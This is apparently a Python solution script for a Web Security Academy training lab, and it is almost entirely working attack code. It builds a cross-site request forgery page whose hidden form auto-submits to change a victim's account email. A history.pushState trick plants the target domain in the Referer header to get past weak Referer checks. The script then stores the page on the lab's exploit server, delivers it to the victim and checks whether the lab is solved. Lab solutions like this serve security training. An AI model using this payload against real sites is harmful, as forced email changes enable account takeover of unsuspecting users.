import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def submit_exploit_server(session, url, response_file, response_head, response_body, form_action):
    params = {
        "urlIsHttps": "on",
        "responseFile": response_file,
        "responseHead": response_head,
        "responseBody": response_body,
        "formAction": form_action
    }
    resp = session.post(url, data=params, verify=False, allow_redirects=True)
    if resp.status_code not in (200, 302):
        raise ValueError(f"Exploit server request failed with status code {resp.status_code}")
    return True


def is_lab_solved(session, host):
    resp = session.get(host, verify=False)
    return "Congratulations, you solved the lab!" in resp.text


def main():
    host = "https://0aec00c503b3b64f802712d5001e007a.web-security-academy.net"
    exploit_host = "https://exploit-0a76002a038db67780be113a01620050.exploit-server.net"
    host_domain = host.split("://", 1)[1]

    payload = f'''
<html>
<body>
<form method="POST" action="{host}/my-account/change-email">
    <input type="hidden" name="email" value="test1@gmail.com"/>
    <input type="submit" value="Submit">
</form>
<script>
    history.pushState("", "", "/?{host_domain}");
    document.forms[0].submit();
</script>
</body>
</html>
'''

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url"

    session = requests.Session()
    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "STORE")
    print("Exploit stored.")

    submit_exploit_server(session, f"{exploit_host}/", "/exploit", response_head, payload, "DELIVER_TO_VICTIM")
    print("Exploit delivered to victim.")

    time.sleep(10)
    if is_lab_solved(session, f"{host}/"):
        print("Koated !!!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()
